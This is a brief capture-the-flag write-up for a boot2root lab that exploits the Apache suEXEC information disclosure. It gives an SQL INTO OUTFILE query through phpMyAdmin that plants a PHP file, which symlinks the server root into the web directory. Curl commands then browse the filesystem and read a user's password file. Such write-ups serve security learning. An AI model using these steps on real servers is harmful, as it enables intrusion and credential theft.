# writeup3

## Apache suEXEC Information Disclosure

The exploit available [here](https://www.exploit-db.com/exploits/27397) allows us to get an online file explorer.

Through `phpmyadmin` we can run this SQL query :

```sql
SELECT '<?php symlink("/", "/var/www/forum/templates_c/nautilus.php"); ?>'
into outfile "/var/www/forum/templates_c/pwn.php"
```

Then run this curl command :

```sh
curl -k https://boot2root/forum/templates_c/pwn.php
```

And go to `https://boot2root/forum/templates_c/nautilus.php/` to get the file explorer.

```sh
curl -k https://boot2root/forum/templates_c/nautilus.php/home/LOOKATME/password
```

And continue the steps to the next users..